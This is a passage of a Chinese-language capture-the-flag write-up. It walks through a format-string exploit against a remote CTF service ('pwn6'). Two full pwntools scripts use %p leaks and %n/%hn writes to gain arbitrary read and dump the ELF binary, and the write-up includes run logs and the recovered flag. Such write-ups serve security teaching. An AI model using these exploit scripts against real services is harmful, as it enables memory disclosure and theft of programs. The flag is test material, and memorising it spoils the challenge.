    b'/home/pwn6/pwn6 0x7ffed176ffe8 0x77702f656d6f682f 82'
    b'x86_64 0x7ffd8dd10819 0x34365f363878 84'
为了让程序泄露出更多的信息，我们需要一个任意指针并开始泄漏数据。下面的脚本中，`run_leak(p,
b'%57001c%26$n')`一行，可以将`0xdead`值写入到堆栈的索引中。
    #!/usr/bin/python
    from pwn import *
    context.update(arch = 'amd64', os = 'linux')
    def run_leak(p, payload):
        prefix = b"XXXX"
        total = prefix + payload
        p.sendline(total)
        p.recvuntil(prefix)
        data = p.recv()
        return data
    def leak_str(p, windex, index):
        payload = ('AAAA' + '%' + str(index) + '$p' + 'CCCC').encode('utf-8')
        r = run_leak(p, payload)
        string = r[4:-4]
        return string
    def main():
        p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 42000)
        baseline = []
        i = 17
        run_leak(p, b'%57001c%26$n')
        for j in range(1, 100):
            leaked_string = leak_str(p, i, j)
            if b'nil' in leaked_string or b'$' in leaked_string:
                pointer = 0
            else:
                pointer = int(leaked_string, 16)
            baseline.append(pointer)
        for i in range(len(baseline)):
            print("%-3d 0x%x" % (i+1, baseline[i]))
    if __name__ == '__main__':
        main()
当索引`26`的地址进行写操作时，索引`39`的地址被`0xdead`覆盖最后四位。
    ...
    17  0x7ffe079258b0
    18  0x0
    19  0x0
    20  0xf5fe6c5e253d7550
    21  0xf45110276a537550
    22  0x0
    23  0x0
    24  0x0
    25  0x1
    26  0x7ffe079258b8
    27  0x7ffe079258c8
    28  0x7f29b9cee190
    29  0x0
    30  0x0
    31  0x5634bfab41f0
    32  0x7ffe079258b0
    33  0x0
    34  0x0
    35  0x5634bfab421e
    36  0x7ffe079258a8
    37  0x1c
    38  0x1
    39  0x7ffe0000dead
    ...
此时，我们就获得一个原语。由于索引`39`包含堆栈地址，我们可以对其修改，让其作为跳板将数据写入另一个索引，这样就可以指向堆栈中的任意点，形如`stack
ptr 1 -> stack ptr 2 -> somewhere in the stack`。  
接下来，需要找寻文件的基址，这里可以使用`.bbs`中的字符串地址和对应的掩码。ELF头是以`ELF`开头，经过一系列尝试，掩码为`0xffffffffffffe000`有很大可能得到正确的地址。完整的脚本如下：
    #!/usr/bin/python
    from pwn import *
    import pwnlib
    #context.log_level = 'debug'
    context.update(arch = 'amd64', os = 'linux')
    def run_leak(p, payload):
        prefix = b"XXXX"
        postfix = b'ZZZZ'
        total = prefix + payload + postfix
        p.sendline(total)
        p.recvuntil(prefix)
        data = p.recvuntil(postfix)
        return data[:-4]
    def adjust_bouncer(p, base, index, offset=0):
        # Adjust the value of index 39 to point at a particular index.
        address = base + (index * 8) + offset
        lower_address = address & 0xffff
        payload = b'%' + str(lower_address).encode('utf-8') + b'c%26$hn'
        p.sendline(payload)
        p.recv()
    def leak_address(p, index):
        payload = ('%' + str(index) + '$p').encode('utf-8')
        r = run_leak(p, payload)
        address = int(r, 16)
        return address
    def leak_data(p, index):
        payload = ('%' + str(index) + '$s').encode('utf-8')
        r = run_leak(p, payload)
        return r
    def write_single(p, value):
        # Value must be a 2 bytes short
        if value > 0:
            payload = b'%' + str(value).encode('utf-8') + b'c%39$hn'
        else:
            payload = b'%39$hn'
        p.sendline(payload)
        p.recv()
    def write_index(p, index_base, index, address, value):
        # Writes an arbitrary value to an index.
        if index == 39:
            # NOT ALLOWEEED
            return
        for i in range(0, 8, 2):
            current_portion = (address >> (i * 8)) & 0xffff
            adjust_bouncer(p, index_base, index, offset=i)
            write_single(p, current_portion)
    def arbitrary_read(p, index_base, address):
        write_index(p, index_base, 41, address, 0)
        data = leak_data(p, 41)
        return data
    def main():
        p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 42000)
        # Index 17 points to Index 38
        # Figure out address of Index 38
        index_17_value = leak_address(p, 17)
        index_38_address = index_17_value
        log.info("Got address of index 38: 0x%x" % index_38_address)
        # Figure out index 0
        index_base = index_38_address - (38 * 8)
        log.info("RSP (index 0): 0x%x" % index_base)
        # Figure out the halfed address to index 39
        index_26_value = leak_address(p, 26)
        log.info("Got address of index 26 (index 39): 0x%x" % index_26_value)
        index_39_value = leak_address(p, 39)
        log.info("Got value of index 39: 0x%x" % index_39_value)
        # Leak address of the format string just to verify.
        index_4_value = leak_address(p, 4)
        log.info("Got address of index 4 (format string): 0x%x" % index_4_value)
        # Leak address of possible .text.
        index_7_value = leak_address(p, 7)
        log.info("Got address of index 7 (format string): 0x%x" % index_7_value)
        elf_start = index_7_value & 0xffffffffffffe000
        log.info("ELF Start: 0x%x" % elf_start)
        def leak(address):
            return arbitrary_read(p, index_base, address)
        elf_header = leak(elf_start)
        log.info("ELF Start Bytes: %s" % elf_header)
        if b'\x7fELF\x02\x01\x01' != elf_header:
            log.info('Attempt failed.')
            return
        elf_contents = elf_header + b'\x00'
        offset = len(elf_contents)
        fd = open("stolen_elf", 'wb')
        fd.write(elf_contents)
        running_index = -1
        while True:
            try:
                next_content = leak(elf_start + offset) + b'\x00'
                elf_contents += next_content
                offset += len(next_content)
                #print(offset, next_content)
                fd.write(next_content)
                if b'TISC20' in next_content:
                    flag = next_content.decode('utf-8')[:-1]
                    log.success('Discovered flag: {}'.format(flag))
                if float(len(elf_contents))/100 > running_index + 1:
                    log.info("Got {} bytes of ELF data so far.".format(len(elf_contents)))
                    running_index += 1
            except:
                log.info("Got EOF, leaked all we could.")
                break
        log.info("Obtained {} bytes of ELF file.".format(len(elf_contents)))
        log.success("Flag: {}.".format(flag))
    if __name__ == '__main__':
        main()
当脚本能成功运行时，检测到ELF头文件，转存为ELF二进制文件。经过很长时间的运行，最终得到falg：
    r10@kali:~/tisc$ python exploit6.py
    [+] Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port 42000: Done
    [*] Got address of index 38: 0x7ffca01db940
    [*] RSP (index 0): 0x7ffca01db810
    [*] Got address of index 26 (index 39): 0x7ffca01db948
    [*] Got value of index 39: 0x7ffca01dcf5c
    [*] Got address of index 4 (format string): 0x5557a54680a0
    [*] Got address of index 7 (format string): 0x5557a54652e0
    [*] ELF Start: 0x5557a5464000
    [*] ELF Start Bytes: b'\x7fELF\x02\x01\x01'
    [*] Got 9 bytes of ELF data so far.
    [*] Got 101 bytes of ELF data so far.
    [*] Got 201 bytes of ELF data so far.
    [*] Got 301 bytes of ELF data so far.
    [*] Got 402 bytes of ELF data so far.
    [*] Got 501 bytes of ELF data so far.
    [*] Got 602 bytes of ELF data so far.
    [*] Got 701 bytes of ELF data so far.
    [*] Got 820 bytes of ELF data so far.
    [*] Got 902 bytes of ELF data so far.
    [*] Got 1001 bytes of ELF data so far.
    ...
    [*] Got 16401 bytes of ELF data so far.
    [+] Discovered flag: TISC20{Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938}
    ...
**Flag:** `TISC20{Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938}`